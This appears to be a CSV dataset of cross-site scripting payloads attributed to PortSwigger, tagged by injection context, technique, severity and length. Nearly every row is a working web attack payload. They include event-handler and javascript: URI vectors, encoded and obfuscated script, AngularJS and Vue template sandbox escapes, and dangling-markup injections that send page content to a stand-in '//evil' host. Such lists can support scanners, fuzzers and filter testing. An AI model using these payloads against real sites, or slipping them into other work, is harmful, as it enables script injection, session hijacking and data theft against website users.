payload,context,technique,severity,length,source
"<img/src/style=transition:0.1s onerror=""window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'"">",attribute,restricted_chars,high,143,portswigger
"<img/src/onerror=""window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'"">",attribute,restricted_chars,high,139,portswigger
<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>,event_handler,restricted_chars,high,139,portswigger
<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>,event_handler,restricted_chars,high,105,portswigger
"<svg onload=onerror=eval;new'""-alert\x281\x29//'>",event_handler,restricted_chars,high,49,portswigger
"<script>onerror=eval,new name</script>",script_injection,restricted_chars,high,38,portswigger
"<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>",script_injection,restricted_chars,high,76,portswigger
"<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\x281\x29',x</script>",script_injection,restricted_chars,high,87,portswigger
"<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>",event_handler,restricted_chars,high,77,portswigger
"<svg onload=""attributes[0].value=name,new onload"">",event_handler,restricted_chars,high,50,portswigger
"<svg onload=""attributes[0].value=id+URL+id,new onload"" id=`>",event_handler,restricted_chars,high,60,portswigger
"<input onfocus=""attributes[0].value=id+URL+id,new onfocus"" id=` autofocus>",event_handler,restricted_chars,high,74,portswigger
<input onclick=attributes[0].value='`'+URL+'`'>,event_handler,restricted_chars,medium,47,portswigger
"<form><input onclick=""formAction=top.name,type='submit',new submit"">",event_handler,restricted_chars,medium,68,portswigger
"<svg onload=innerHTML=URL,innerHTML=textContent>",event_handler,restricted_chars,high,48,portswigger
"<img/src/onerror=innerHTML=URL,innerHTML=textContent>",event_handler,restricted_chars,high,53,portswigger
"<svg onload=innerHTML=URL,eval(textContent)>",dom_sink,restricted_chars,high,44,portswigger
<xss class=progress-bar-animated onanimationstart=alert(1)>,event_handler,event_handler,high,59,portswigger
"<xss class=""carousel slide"" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=""carousel-item active""></xss><xss class=carousel-item></xss></xss></xss>",attribute,event_handler,medium,199,portswigger
"<iframe src=""javascript:alert(1)"">",js_uri,protocol,medium,34,portswigger
"<a href=""javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,37,portswigger
"<a href=""JaVaScript:alert(1)"">XSS</a>",js_uri,protocol,medium,37,portswigger
"<a href="" 	javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,39,portswigger
"<a href=""javas	cript:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38,portswigger
"<a href=""javascript
:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38,portswigger
"<svg><a xlink:href=""javascript:alert(1)""><text x=""20"" y=""20"">XSS</text></a>",js_uri,protocol,medium,75,portswigger
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,118,portswigger
<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,121,portswigger
<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,106,portswigger
"<script src=""data:text/javascript,alert(1)""></script>",script_injection,script_tag,high,53,portswigger
"<svg><script href=""data:text/javascript,alert(1)"" />",js_uri,script_tag,high,52,portswigger
"<script>import('data:text/javascript,alert(1)')</script>",script_injection,script_tag,high,56,portswigger
"<math><x href=""javascript:alert(1)"">blah",js_uri,protocol,medium,40,portswigger
<form><button formaction=javascript:alert(1)>XSS,js_uri,protocol,medium,48,portswigger
<form><input type=submit formaction=javascript:alert(1) value=XSS>,js_uri,protocol,medium,66,portswigger
<form action=javascript:alert(1)><input type=submit value=XSS>,js_uri,protocol,medium,62,portswigger
"<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=""https://portswigger.net?&semi;javascript:alert(1)&semi;0"" /><a id=xss><text x=20 y=20>XSS</text></a>",js_uri,obfuscation,medium,202,portswigger
<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>,js_uri,obfuscation,medium,77,portswigger
<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>,js_uri,obfuscation,medium,95,portswigger
<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>,js_uri,obfuscation,medium,96,portswigger
<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>,js_uri,obfuscation,medium,97,portswigger
<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>,js_uri,obfuscation,medium,95,portswigger
<script>navigation.navigate('javascript:alert(1)')</script>,script_injection,script_tag,high,59,portswigger
"<iframe srcdoc=""<img src=1 onerror=alert(1)>""></iframe>",attribute,event_handler,high,55,portswigger
"<iframe srcdoc=""&lt;img src=1 onerror=alert(1)&gt;""></iframe>",attribute,event_handler,high,61,portswigger
"<form action=""javascript:alert(1)""><input type=submit id=x></form><label for=x>XSS</label>",tag_injection,protocol,low,90,portswigger
"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)""> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",attribute,event_handler,medium,106,portswigger
"<link rel=""canonical"" accesskey=""X"" onclick=""alert(1)"" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",attribute,event_handler,medium,109,portswigger
"<a href=# download=""filename.html"">Test</a>",tag_injection,tag_injection,low,43,portswigger
"<img referrerpolicy=""no-referrer"" src=""//portswigger-labs.net"">",tag_injection,obfuscation,low,63,portswigger
"<a href=# onclick=""window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')"">XSS</a>",dom_sink,obfuscation,medium,148,portswigger
"<iframe name=""alert(1)"" src=""https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></iframe>",dom_sink,obfuscation,medium,124,portswigger
"<base target=""alert(1)""><a href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"">XSS via target in base tag</a>",dom_sink,obfuscation,medium,159,portswigger
"<a target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"">XSS via target in a tag</a>",dom_sink,obfuscation,medium,150,portswigger
"<img src=""validimage.png"" width=""10"" height=""10"" usemap=""#xss""><map name=""xss""><area shape=""rect"" coords=""0,0,82,126"" target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></map>",dom_sink,obfuscation,medium,244,portswigger
"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""XSS via target in a form""></form>",dom_sink,obfuscation,medium,249,portswigger
"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""XSS via formtarget in input type submit""></form>",dom_sink,obfuscation,medium,272,portswigger
"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input name=1 type=""image"" src=""validimage.png"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""XSS via formtarget in input type image""></form>",dom_sink,obfuscation,medium,298,portswigger
"<meta http-equiv=""refresh"" content=""0; url=//portswigger-labs.net"">",attribute,obfuscation,medium,67,portswigger
"<meta charset=""UTF-7"" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,tag_injection,low,66,portswigger
"<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-7"" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",attribute,event_handler,medium,111,portswigger
"+/v8
+ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
"+/v9
+ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
"+/v+
+ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
"+/v/
+ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
"<meta http-equiv=""Content-Security-Policy"" content=""upgrade-insecure-requests"">",attribute,event_handler,medium,79,portswigger
"<iframe sandbox src=""//portswigger-labs.net""></iframe>",tag_injection,obfuscation,low,54,portswigger
"<meta name=""referrer"" content=""no-referrer"">",attribute,event_handler,medium,44,portswigger
"%C0%BCscript>alert(1)</script>
%E0%80%BCscript>alert(1)</script>
%F0%80%80%BCscript>alert(1)</script>
%F8%80%80%80%BCscript>alert(1)</script>
%FC%80%80%80%80%BCscript>alert(1)</script>",attribute_escape,encoding,medium,184,portswigger
<script>\u0061lert(1)</script>,script_injection,encoding,high,30,portswigger
<script>\u{61}lert(1)</script>,script_injection,encoding,high,30,portswigger
<script>\u{0000000061}lert(1)</script>,script_injection,encoding,high,38,portswigger
<script>eval('\x61lert(1)')</script>,dom_sink,encoding,high,36,portswigger
"<script>eval('\141lert(1)')</script>
<script>eval('alert(\061)')</script>
<script>eval('alert(\61)')</script>",dom_sink,encoding,high,109,portswigger
"<a href=""&#106;avascript:alert(1)"">XSS</a><a href=""&#106avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,83,portswigger
"<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x=""&quot;,alert(1)//"";</script></svg>",script_injection,encoding,high,179,portswigger
"<a href=""&#0000106avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,45,portswigger
"<a href=""&#x6a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,42,portswigger
"<a href=""j&#x61vascript:alert(1)"">XSS</a>
<a href=""&#x6a
avascript:alert(1)"">XSS</a>
<a href=""&#x6a avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,127,portswigger
"<a href=""&#x0000006a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,48,portswigger
"<a href=""&#X6A;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,42,portswigger
"<a href=""javascript&colon;alert(1)"">XSS</a>
<a href=""java&Tab;script:alert(1)"">XSS</a>
<a href=""java&NewLine;script:alert(1)"">XSS</a>
<a href=""javascript&colon;alert&lpar;1&rpar;"">XSS</a>",attribute_escape,encoding,medium,187,portswigger
"<a href=""javascript:x='%27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,50,portswigger
"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,57,portswigger
"<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>",script_injection,obfuscation,high,62,portswigger
"<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>",script_injection,obfuscation,high,122,portswigger
"<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>",script_injection,obfuscation,high,86,portswigger
<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>,attribute_escape,obfuscation,medium,76,portswigger
"<iframe src=""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""></iframe>",attribute_escape,obfuscation,medium,247,portswigger
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>,script_injection,obfuscation,high,211,portswigger
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>,event_handler,obfuscation,high,79,portswigger
{{constructor.constructor('alert(1)')()}},template_injection,template,medium,41,portswigger
"<div v-html=""''.constructor.constructor('alert(1)')()"">a</div>",template_injection,template,medium,62,portswigger
<x v-html=_c.constructor('alert(1)')()>,template_injection,template,medium,39,portswigger
<x v-if=_c.constructor('alert(1)')()>,template_injection,template,medium,37,portswigger
{{_c.constructor('alert(1)')()}},template_injection,template,medium,32,portswigger
{{_v.constructor('alert(1)')()}},template_injection,template,medium,32,portswigger
{{_s.constructor('alert(1)')()}},template_injection,template,medium,32,portswigger
"<p v-show=""_c.constructor`alert(1)`()"">",template_injection,template,medium,39,portswigger
<x v-on:click='_b.constructor`alert(1)`()'>click</x>,template_injection,template,medium,52,portswigger
<x v-bind:a='_b.constructor`alert(1)`()'>,template_injection,template,medium,41,portswigger
<x @[_b.constructor`alert(1)`()]>,template_injection,template,medium,33,portswigger
<x :[_b.constructor`alert(1)`()]>,template_injection,template,medium,33,portswigger
<p v-=_c.constructor`alert(1)`()>,template_injection,template,medium,33,portswigger
<x #[_c.constructor`alert(1)`()]>,template_injection,template,medium,33,portswigger
<p :=_c.constructor`alert(1)`()>,template_injection,template,medium,32,portswigger
{{_b.constructor`alert(1)`()}},template_injection,template,medium,30,portswigger
"<x v-bind:is=""'script'"" src=""//14.rs"" />",template_injection,template,medium,40,portswigger
<x is=script src=//⑭.₨>,template_injection,template,medium,23,portswigger
<x @click='_b.constructor`alert(1)`()'>click</x>,template_injection,template,medium,48,portswigger
"<x title""=""&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"">",template_injection,template,medium,52,portswigger
"<x title""=""&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"">",dom_sink,template,medium,73,portswigger
<xyz<img/src onerror=alert(1)>>,event_handler,template,high,31,portswigger
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>,dom_sink,template,high,116,portswigger
"<a @['c\lic\u{6b}']=""_c.constructor('alert(1)')()"">test</a>",template_injection,template,medium,59,portswigger
{{$el.ownerDocument.defaultView.alert(1)}},template_injection,template,medium,42,portswigger
{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}},template_injection,template,high,56,portswigger
<img src @error=e=$event.path.pop().alert(1)>,template_injection,template,medium,45,portswigger
<img src @error=e=$event.composedPath().pop().alert(1)>,template_injection,template,medium,55,portswigger
<img src @error=this.alert(1)>,template_injection,template,medium,30,portswigger
<svg@load=this.alert(1)>,template_injection,template,medium,24,portswigger
"<p slot-scope=""){}}])+this.constructor.constructor('alert(1)')()})};//"">",template_injection,template,medium,72,portswigger
{{_openBlock.constructor('alert(1)')()}},template_injection,template,medium,40,portswigger
{{_createBlock.constructor('alert(1)')()}},template_injection,template,medium,42,portswigger
{{_toDisplayString.constructor('alert(1)')()}},template_injection,template,medium,46,portswigger
{{_createVNode.constructor('alert(1)')()}},template_injection,template,medium,42,portswigger
<p v-show=_createBlock.constructor`alert(1)`()>,template_injection,template,medium,47,portswigger
<x @[_openBlock.constructor`alert(1)`()]>,template_injection,template,medium,41,portswigger
<x @[_capitalize.constructor`alert(1)`()]>,template_injection,template,medium,42,portswigger
<x @click=_withCtx.constructor`alert(1)`()>click</x>,template_injection,template,medium,52,portswigger
<x @click=$event.view.alert(1)>click</x>,template_injection,template,medium,40,portswigger
{{_Vue.h.constructor`alert(1)`()}},template_injection,template,medium,34,portswigger
{{$emit.constructor`alert(1)`()}},template_injection,template,medium,33,portswigger
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>,script_injection,template,high,85,portswigger
<component is=script text=alert(1)>,template_injection,template,medium,35,portswigger
{{$on.constructor('alert(1)')()}},template_injection,template,medium,33,portswigger
"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",template_injection,template,medium,122,portswigger
"{{{}."")));alert(1)//""}}",template_injection,template,medium,23,portswigger
"{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}",template_injection,template,medium,106,portswigger
"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[""a"",""alert(1)""].sort(toString.constructor);}}",template_injection,template,medium,124,portswigger
"{{!ready && (ready = true) && (
!call
? $$watchers[0].get(toString.constructor.prototype)
: (a = apply) &&
(apply = constructor) &&
(valueOf = call) &&
(''+''.toString(
'F = Function.prototype;' +
'F.apply = F.a;' +
'delete F.a;' +
'delete F.valueOf;' +
'alert(1);'
)));}}",template_injection,template,medium,272,portswigger
"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}",template_injection,template,medium,128,portswigger
"{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}",template_injection,template,medium,102,portswigger
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}},template_injection,template,medium,65,portswigger
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}},template_injection,template,medium,74,portswigger
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}},template_injection,template,medium,79,portswigger
"{{
c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
c.$apply=$apply;c.$eval=b;op=$root.$$phase;
$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
B=C(b,c,b);$evalAsync(""
astNode=pop();astNode.type='UnaryExpression';
astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
astNode.argument={type:'Identifier',name:'foo'};
"");
m1=B($$asyncQueue.pop().expression,null,$root);
m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
$eval('a(b.c)');[].push.apply=a;
}}",template_injection,template,medium,517,portswigger
"{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync(""astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};"");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}",template_injection,template,medium,326,portswigger
constructor.constructor('alert(1)')(),template_injection,template,medium,37,portswigger
"a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()",template_injection,template,medium,118,portswigger
"toString.constructor.prototype.toString=toString.constructor.prototype.call;[""a"",""alert(1)""].sort(toString.constructor)",template_injection,template,medium,119,portswigger
"{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()",template_injection,template,medium,317,portswigger
"{}."")));alert(1)//"";",template_injection,template,medium,20,portswigger
'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';,template_injection,template,medium,75,portswigger
{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)',template_injection,template,medium,70,portswigger
"toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)",template_injection,template,medium,134,portswigger
"<input autofocus ng-focus=""$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"">",template_injection,template,high,91,portswigger
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>,template_injection,template,medium,66,portswigger
"<div ng-app ng-csp><div ng-focus=""x=$event;"" id=f tabindex=0>foo</div><div ng-repeat=""(key, value) in x.view""><div ng-if=""key == 'window'"">{{ [1].reduce(value.alert, 1); }}</div></div></div>",template_injection,template,medium,190,portswigger
<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>,template_injection,template,medium,59,portswigger
"<body background=""//evil?
<table background=""//evil?
<table><thead background=""//evil?
<table><tbody background=""//evil?
<table><tfoot background=""//evil?
<table><td background=""//evil?
<table><th background=""//evil?",tag_injection,obfuscation,low,216,portswigger
"<link rel=stylesheet href=""//evil?",tag_injection,obfuscation,low,34,portswigger
"<link rel=icon href=""//evil?",tag_injection,obfuscation,low,28,portswigger
"<meta http-equiv=""refresh"" content=""0; http://evil?",attribute,obfuscation,medium,51,portswigger
"<img src=""//evil?
<image src=""//evil?",tag_injection,obfuscation,low,37,portswigger
"<video><track default src=""//evil?",tag_injection,obfuscation,low,34,portswigger
"<video><source src=""//evil?",tag_injection,obfuscation,low,27,portswigger
"<audio><source src=""//evil?",tag_injection,obfuscation,low,27,portswigger
"<input type=image src=""//evil?",tag_injection,obfuscation,low,30,portswigger
"<form><button style=""width:100%;height:100%"" type=submit formaction=""//evil?",tag_injection,obfuscation,low,76,portswigger
"<form><input type=submit value=""XSS"" style=""width:100%;height:100%"" type=submit formaction=""//evil?",tag_injection,obfuscation,low,99,portswigger
"<button form=x style=""width:100%;height:100%;""><form id=x action=""//evil?",tag_injection,obfuscation,low,73,portswigger
"<object data=""//evil?",tag_injection,obfuscation,low,21,portswigger
"<iframe src=""//evil?",tag_injection,obfuscation,low,20,portswigger
"<embed src=""//evil?",tag_injection,obfuscation,low,19,portswigger
<form><button formaction=//evil>XSS</button><textarea name=x>,tag_injection,obfuscation,low,61,portswigger
<button form=x>XSS</button><form id=x action=//evil target=',tag_injection,obfuscation,low,60,portswigger
"<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=""",tag_injection,obfuscation,low,140,portswigger
"<form><input type=submit value=""Click me"" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=""",tag_injection,obfuscation,low,130,portswigger
"<a href=abc style=""width:100%;height:100%;position:absolute;font-size:1000px;"">xss<base href=""//evil/",tag_injection,obfuscation,low,101,portswigger
"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,82,portswigger
"<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,83,portswigger
"<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,84,portswigger
"<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,92,portswigger
"<input type=hidden type=image src=""//evil?",tag_injection,obfuscation,low,42,portswigger
"<video poster=""//evil?",tag_injection,obfuscation,low,22,portswigger
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",js_uri,obfuscation,high,112,portswigger
"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \""
 onmouseover=/*&lt;svg/*/onload=alert()//>",js_uri,obfuscation,high,142,portswigger
"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/""/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>",js_uri,obfuscation,high,143,portswigger
';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59,portswigger
';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,55,portswigger
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,55,portswigger
';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,53,portswigger
';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59,portswigger
';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59,portswigger
';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,67,portswigger
';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78,portswigger
';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,74,portswigger
';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,74,portswigger
';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,72,portswigger
';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78,portswigger
';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78,portswigger
';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,86,portswigger
';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107,portswigger
';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,103,portswigger
';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,103,portswigger
';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,101,portswigger
';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107,portswigger
';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107,portswigger
';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,115,portswigger
"';window['\x65\x76\x61\x6c']('window[""\x61\x6c\x65\x72\x74""](window[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101,portswigger
"';self['\x65\x76\x61\x6c']('self[""\x61\x6c\x65\x72\x74""](self[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,95,portswigger
"';this['\x65\x76\x61\x6c']('this[""\x61\x6c\x65\x72\x74""](this[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,95,portswigger
"';top['\x65\x76\x61\x6c']('top[""\x61\x6c\x65\x72\x74""](top[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,92,portswigger
